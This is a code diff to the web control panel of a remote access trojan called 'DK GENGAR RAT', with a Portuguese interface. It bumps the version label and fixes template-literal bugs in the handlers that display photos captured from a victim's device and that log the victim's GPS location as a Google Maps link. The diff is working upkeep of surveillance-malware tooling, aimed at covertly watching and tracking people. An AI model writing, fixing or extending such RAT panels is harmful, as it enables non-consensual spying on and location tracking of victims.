@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DK GENGAR RAT - V1.3 (Infiltrated Edition)</title>
+    <title>DK GENGAR RAT - V1.6 (Secured Edition)</title>
     <style>
         :root {
             --roxo-sombrio: #1a0033;
@@ -160,7 +160,7 @@
         </div>
         <div class="watermark">
             Powered by <strong>DK</strong><br>
-            V1.3 Signature Edition
+            V1.6 Secured Edition
         </div>
     </div>
 
@@ -251,15 +251,15 @@
             img.src = 'data:image/jpeg;base64,' + data;
             
             const log = document.getElementById("log-terminal");
-            log.innerHTML += `[\${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📸 Foto recebida e exibida no Preview!</span><br>`;
+            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📸 Foto recebida e exibida no Preview!</span><br>`;
             log.scrollTop = log.scrollHeight;
         });
 
         socket.on('display_location', (data) => {
             const log = document.getElementById("log-terminal");
-            const googleMapsUrl = `https://www.google.com/maps?q=\${data.lat},\${data.lon}`;
-            log.innerHTML += `[\${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📍 Localização Recebida: </span><br>`;
-            log.innerHTML += `<a href="\${googleMapsUrl}" target="_blank" style="color: #00ff00; text-decoration: underline;">Clique aqui para ver no Google Maps</a><br>`;
+            const googleMapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📍 Localização Recebida: </span><br>`;
+            log.innerHTML += `<a href="${googleMapsUrl}" target="_blank" style="color: #00ff00; text-decoration: underline;">Clique aqui para ver no Google Maps</a><br>`;
             log.scrollTop = log.scrollHeight;
         });
 
